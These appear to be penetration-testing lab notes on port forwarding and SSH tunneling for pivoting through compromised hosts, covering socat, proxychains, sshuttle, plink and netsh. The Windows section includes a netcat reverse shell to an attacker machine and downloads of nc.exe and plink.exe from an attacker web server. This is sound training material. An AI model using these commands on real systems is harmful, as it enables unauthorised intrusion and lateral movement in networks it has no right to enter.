# Port Redirection and SSH Tunneling



## Port Forwarding with Socat

Socat is a general-purpose networking tool that can set up a simple port forward in a single command.


`-ddd`: verbose
`fork`: fork into a new subprocess when it receives a connection (fork) instead of dying after a single connection

```
# On TARGET 1 (pivoting machine)
# listen 2345 and forward to port 5432
socat -ddd TCP-LISTEN:2345,fork TCP:[TARGET 2]:5432

# From the ATTACKER connecting to TCP port 2345 on TARGET 1 will be exactly like connecting directly to TCP port 5432 on TARGET 2
psql -h [TARGET 2] -p 2345 -U postgres
```




`socat` is not the only way to create port forwards on *NIX hosts. There are several alternatives, of note:



### rinetd
Is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations, but is slightly unwieldy for temporary port forwarding solutions.





### nc
We can combine Netcat and a FIFO named pipe file to create a port forward.
```
#!/usr/bin/env bash

set -e

if [ $# != 3 ]; then

        echo 'Usage: nc-tcp-forward.sh $FRONTPORT $BACKHOST $BACKPORT' >&2
        exit 1
fi

FRONTPORT=$1
BACKHOST=$2
BACKPORT=$3

FIFO=/tmp/backpipe

trap 'echo "trapped."; pkill nc; rm -f $FIFO; exit 1' 1 2 3 15

mkfifo $FIFO
while true; do
        nc -l $FRONTPORT <$FIFO | nc $BACKHOST $BACKPORT >$FIFO
done
rm -f $FIFO
```







### iptables
If we have root privileges, we could use `iptables` to create port forwards.
The specific `iptables` port forwarding setup for a given host will likely depend on the configuration already in place.
To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to `/proc/sys/net/ipv4/conf/[interface]/forwarding` (if it's not already configured to allow it).


































## SSH Tunneling

Tunneling describes the act of encapsulating one kind of data stream within another.

The SSH protocol is primarily a tunneling protocol, so it's possible to pass almost any kind of data through an SSH connection. For that reason, tunneling capabilities are built into most SSH tools.




### Local Port Forwarding
Limitation: we can only connect to one socket per SSH connection. 

A local port forward can be set up using OpenSSH's `-L` option, which takes two sockets (in the format IPADDRESS:PORT) separated with a colon as an argument
- The first socket is the listening socket that will be bound to the SSH client machine.
- The second socket is where we want to forward the packets to.
- The rest of the SSH command is as usual - pointed at the SSH server and user we wish to connect as.


`-N`: prevents SSH from executing any remote commands, meaning we will only receive output related to our port forward.

`-L`: set up local port forwarding



If the SSH connection or the port forwarding fails for some reason, and the output we get from the standard SSH session isn't sufficient to troubleshoot it, we can pass the `-v` flag to ssh in order to receive debug output.




Example 1:
Connect to TARGET 1 (who has access to TARGET 2), and forward TARGET 2 port 80 to localhost 8080
```
ssh -p 2222 -N -L 8080:[TARGET 2]:80 [useraname]@[TARGET 1]


# this will show TARGET 2 port 80
curl localhost:8080
```






Example 2:

On TARGET 1 (pivot machine):
listen on all interfaces on port 4455 (0.0.0.0:4455)
then forward all packets (through the SSH tunnel to TARGET 3) to port 445 on the newly-found host ([TARGET 2]:445).
```
ssh -N -L 0.0.0.0:4455:[TARGET 3]:445 database_admin@[TARGET 2]
```
(We're listening on port 4455 because we don't have the permissions to listen on any port below 1024.)

Also, make sure to have TTY functionality.
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```




Now connecting to port `4455` on TARGET 1  will now be just like connecting directly to port 445 on the TARGET 3. For example:
From ATTACKER MACHINE:
```
smbclient -p 4455 -L //[TARGET 1 (TARGET 3)]/ -U hr_admin --password=Welcome1234
```

















### Dynamic Port Forwarding

From a single listening port on the SSH client, packets can be forwarded to any socket that the SSH server host has access to.


SSH dynamic port forwarding works because the listening port that the SSH client creates is a SOCKS proxy server port.

SOCKS is a proxying protocol. Much like a postal service, a SOCKS server accepts packets (with a SOCKS protocol header) and forwards them on to wherever they're addressed.


Packets can be sent to a single listening SOCKS port on the SSH client machine.
These will be pushed through the SSH connection, then forwarded to anywhere the SSH server machine can route.

The only limitation is that the packets have to be properly formatted - most often by SOCK-compatible client software. In some cases, software is not SOCKS-compatible by default.


`proxychains` is a tool that can force network traffic from third party tools over HTTP or SOCKS proxies. As the name suggests, it can also be configured to push traffic over a chain of concurrent proxies.


How `proxychains` works:
it uses the Linux shared object preloading technique (LD_PRELOAD) to hook libc networking functions within the binary that gets passed to it, and forces all connections over the configured proxy server.
This means it might not work for everything, but will work for most dynamically-linked binaries that perform simple network operations.
It won't work on statically-linked binaries.


Proxychains uses a configuration file for almost everything, stored by default at `/etc/proxychains4.conf`.
We need to edit this file to ensure that Proxychains can locate our SOCKS proxy port, and confirm that it's a SOCKS proxy (rather than any other kind of proxy).
By default, proxies are defined at the end of the file.
We can simply replace any existing proxy definition in that file with a single line defining the proxy type, IP address, and port of the SOCKS proxy running on.
Example: `socks5 192.168.50.63 9999`

Although we specify socks5 in this example, it could also be socks4, since SSH supports both.
SOCKS5 supports authentication, IPv6, and User Datagram Protocol (UDP), including DNS.
Some SOCKS proxies will only support the SOCKS4 protocol.

Make sure you check which version is supported by the SOCKS server when using SOCKS proxies in engagements.


Note: by default, Proxychains is configured with very high time-out values. This can make port scanning really slow. Lowering the `tcp_read_time_out` and `tcp_connect_time_out` values in the Proxychains configuration file will force Proxychains to time-out on non-responsive connections more quickly. This can dramatically speed up port-scanning times.

```
cat /etc/proxychains4.conf
...
# DEFAULT
tcp_read_time_out 15000
tcp_connect_time_out 8000
...
```


Example: TARGET 3 is only accesible from TARGET 2

1. On TARGET 1:
Create SSH connection to TARGET 2 with dynamic port forwarding
```
ssh -N -D 0.0.0.0:[PORT] database_admin@[TARGET 2]
```

2. On ATTACKER MACHINE Add `socks5 [TARGET 1] [PORT, ex: 9999]` to /etc/proxychains4.conf

3. On ATTACKER MACHINE:
```
proxychains smbclient -L //[TARGET 3]/ -U hr_admin --password=Welcome1234

proxychains nmap -vvv -sT --top-ports=20 -Pn [TARGET 3]
```












### SSH Remote Port Forwarding
- <https://man.openbsd.org/ssh#R>

Inbound traffic is often controlled much more aggressively than outbound traffic.

In a similar way that an attacker may execute a remote shell payload to connect back to an attacker-controlled listener, SSH remote port forwarding can be used to connect back to an attacker-controlled SSH server, and bind the listening port there. We can think of it like a reverse shell, but for port forwarding.

While in local and dynamic port forwarding, the listening port is bound to the SSH client, in remote port forwarding, the listening port is bound to the SSH server. Instead of the packet forwarding being done by the SSH server, in remote port forwarding, packets are forwarded by the SSH client.






Example:
Connect from TARGET 1 to our ATTACKER MACHINE over SSH.
The listening TCP port 2345 is bound to the loopback interface on our ATTACKER MACHINE.
Packets sent to this port are pushed by the ATTACKER MACHINE SSH server software through the SSH tunnel back to the SSH client on TARGET 1.
They are then forwarded to the port on TARGET 2.


1. On ATTACKER MACHINE enable the SSH server.
```
sudo systemctl start ssh

# check that the SSH port is open as we expected using ss
sudo ss -ntplu
```

In order to connect back to the Kali SSH server using a username and password you may have to explicity allow password-based authentication by setting `PasswordAuthentication` to yes in `/etc/ssh/sshd_config`



2. On TARGET 1

The SSH remote port forward option is `-R`, and has a very similar syntax to the local port forward option.
It also takes two socket pairs as the argument:
- the listening socket is defined first
- the forwarding socket is second

In this case, we want to listen on port 2345 on our ATTTACKER MACHINE (127.0.0.1:2345), and forward all traffic to the PostgreSQL port on TARGET 2 (10.4.50.215:5432).


```
python3 -c 'import pty; pty.spawn("/bin/bash")'

ssh -N -R [ATTACKER MACHINE loopback]:[PORT]:[TARGET 2]:5432 kali@[ATTACKER MACHINE]
# Example
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

3.
Probe port on the loopback interface of ATTACKER MACHINE as though we're probing the PostgreSQL database port on TARGET 2 directly!
```
psql -h 127.0.0.1 -p 2345 -U postgres
```

We're now interacting with the PostgreSQL instance running on VICTIM 2 through our SSH remote port forward by connecting to port 2345 on our own ATTACKER MACHINE.

In this section, we created an SSH remote port forward to allow us to connect to an internal database server from our Kali machine. We did this while traversing a perimeter firewall, which would otherwise block inbound connections.











### SSH Remote Dynamic Port Forwarding

Creates a dynamic port forward in the remote configuration.
The SOCKS proxy port is bound to the SSH server, and traffic is forwarded from the SSH client.


Remote dynamic port forwarding has only been available since October 2017's OpenSSH 7.6

Despite this, only the OpenSSH client needs to be version 7.6 or above to use it. The server version doesn't matter.




1. From TARGET 1

```
python3 -c 'import pty; pty.spawn("/bin/bash")'

# bind the SOCKS proxy to [some PORT, ex 9999] on the loopback interface of our Kali machine
# Also add `socks5 127.0.0.1 [PORT]` to `/etc/proxychains4.conf`
ssh -N -R [PORT] kali@[ATTACKER MACHINE]
```



2. As in classic dynamic port forwarding example, use `proxychains` to tunnel traffic over this SOCKS proxy port. Edit the configuration file at `/etc/proxychains4.conf` on our Kali machine to reflect our new local SOCKS proxy port. Add `socks5 127.0.0.1 [PORT]`.

Then we can run the commands:
```

proxychains nmap -vvv -sT --top-ports=20 -Pn -n [TARGET 2]

```















## sshuttle
- <https://github.com/sshuttle/sshuttle>

Turns an SSH connection into something similar to a VPN by setting up local routes that force traffic through the SSH tunnel.


Requires:
- root privileges on the SSH client
- Python3 on the SSH server


1. On TARGET 1
```
socat TCP-LISTEN:2222,fork TCP:[TARGET 2]:22
```




2. On ATTACKER MACHINE
Run `sshuttle`, specifying the SSH connection string we want to use, as well as the subnets that we want to tunnel through this connection (10.4.50.0/24 and 172.16.50.0/24).

```
sshuttle -r [USER]@[TARGET 1]:2222 [SUBNET 1] [SUBNET 2]

# Example
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24

```



3. Also on ATTACKER MACHINE
```
# Connect to any of the subnets specified
smbclient -L //[TARGET 3]/ -U hr_admin --password=Welcome1234

smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```































## Port Forwarding with Windows Tools



### SSH on Windows / ssh.exe

The OpenSSH client has been bundled with Windows by default since version 1803 (April 2018 Update) and has been available as a Feature-on-Demand since 1709 (Windows 10 Fall Creators Update).

On Windows versions with SSH installed, we will find `scp.exe`, `sftp.exe`, `ssh.exe`, along with other ssh-* utilities in %systemdrive%\Windows\System32\OpenSSH location by default.



1. On ATTACKER MACHINE
```
sudo systemctl start ssh

xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:[TARGET 1 (WINDOWS)]

```


2. On TARGET 1 (WINDOWS)
```
where ssh

# check OpenSSH bundled with Windows is higher than 7.6
ssh.exe -V

```

Create a remote dynamic port forward to our Kali machine.
Set the [PORT] to `-R` and authenticate as kali back on our Kali machine.

```
ssh -N -R [PORT] kali@[ATTACKER MACHINE]
```


3. On ATTACKER MACHINE
Udapte `/etc/proxychains4.conf`
```
socks5 127.0.0.1 [PORT]
```


Now that the configuration file is pointing at our remote dynamic port forward SOCKS port, we can run commands through proxychains:
```
# Example:
proxychains psql -h [TARGET 3] -U postgres
```











### Plink
Administrators may want to avoid leaving OpenSSH on their Windows machines, so we're not guaranteed to discover an OpenSSH client. Even if we find ourselves on a recent version of Windows, the network administrators may have removed it.

Nevertheless, network administrators still need remote administration tools. Most networks have SSH servers running somewhere, and administrators need tools to connect to these servers from Windows hosts.

Before OpenSSH was so readily available on Windows, most network administrators' tools of choice were `PuTTY` and its command-line-only counterpart `Plink`.

Plink doesn't have is remote dynamic port forwarding.



1. send `nc.exe` and `plink` to compromised target

1.a share with apache server
```
sudo systemctl start apache2
find / -name nc.exe 2>/dev/null
sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/

find / -name plink.exe 2>/dev/null
sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
```


or


1.b download 
```
powershell wget -Uri http://192.168.45.174/nc.exe -OutFile C:\Windows\Temp\nc.exe
powershell wget -Uri http://192.168.45.174/plink.exe -OutFile C:\Windows\Temp\plink.exe
```




2. set up a Netcat listener on [PORT] on our Kali machine.
```
nc -nvlp 4446
```




3. then from the windows machine:
```
C:\Windows\Temp\nc.exe -e cmd.exe [ATTACKER MACHINE] [PORT]
```

4. set up Plink with a remote port forward so that we can access the windows target using RDP

The command syntax to set up a remote port forward with Plink is very similar to the OpenSSH client remote port forward command. After the -R option, we'll pass the socket we want to open on the Kali SSH server, and the RDP server port on the loopback interface of MULTISERVER03 that we want to forward packets to.

If we won't be able to respond to this prompt, an easy solution in that case would be to automate the confirmation with `cmd.exe /c echo y`, piped into the `plink.exe` command.
This will emulate the confirmation that we usually type when prompted
```
cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l [ATTACKER USERNAME] -pw [ATTACKER PASSWORD] -R 127.0.0.1:9833:127.0.0.1:3389 [ATTACKER MACHINE]
```

NOTE: This might log our Kali password somewhere undesirable! If we're in a hostile network, we may wish to create a port-forwarding only user on our Kali machine for remote port forwarding situations.

5.
Now we can connect to port 9983 on our Kali loopback interface with xfreerdp.
```
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
```












### Netsh
The built-in firewall configuration tool `netsh` (also known as Network Shell).
Using `netsh`, we can set up a port forward with the portproxy subcontext within the interface context.

While `netsh` requires administrative privileges to create a port forward on Windows, it can be very useful in some restrictive situations.

The portproxy subcontext of the netsh interface command requires administrative privileges to make any changes.



1. From the Windows target:
instruct netsh interface to add a portproxy rule from an IPv4 listener that is forwarded to an IPv4 port (v4tov4).
This will listen on port 2222 on the external-facing interface (listenport=2222 listenaddress=[WINDOWS IP]) and forward packets to port 22 on [TARGET 3] (connectport=22 connectaddress=[TARGET 3 IP]).

```
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215

# confirm that port 2222 is listening using netstat
netstat -anp TCP | find "2222"

# We can also confirm that the port forward is stored by issuing the show all command in the netsh interface portproxy subcontext.
netsh interface portproxy show all
```





2. Case port 2222 filtered! It's most likely that the Windows Firewall is blocking inbound connections to port 2222.
```
sudo nmap -sS 192.168.50.64 -Pn -n -p2222

# Output:
PORT     STATE    SERVICE
2222/tcp filtered EtherNetIP-1
MAC Address: 00:0C:29:A9:9F:3D (VMware)
```


In order to access it, we need to poke a hole in the firewall on [TARGET 2]. (We'll also need to remember to plug that hole as soon as we're finished with it!)

We can use the `netsh advfirewall firewall` subcontext to create the hole.
We will use the add rule command and name the rule "port_forward_ssh_2222". We need to use a memorable or descriptive name, because we'll use this name to delete the rule later on.

```
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=[WINDOWS IP] localport=2222 action=allow
```



The port is open! We can now SSH to port 2222 on [TARGET 2], as though connecting to port 22 on [WINDOWS TARGET].



3.
Once we're done with the connection, we need to remember to delete the firewall rule we just created.
```
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
```



We can also delete the port forward we created.
This time we'll use the `netsh interface` subcontext to del the portproxy we created. We will reference the forwarding type (v4tov4) and the listenaddress and listenport we used when creating the rule, so Netsh can determine which rule to delete.

```
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=[WINDOWS IP]
```


NOTE: most Windows Firewall commands have PowerShell equivalents with commandlets like `New-NetFirewallRule` and `Disable-NetFirewallRule`.













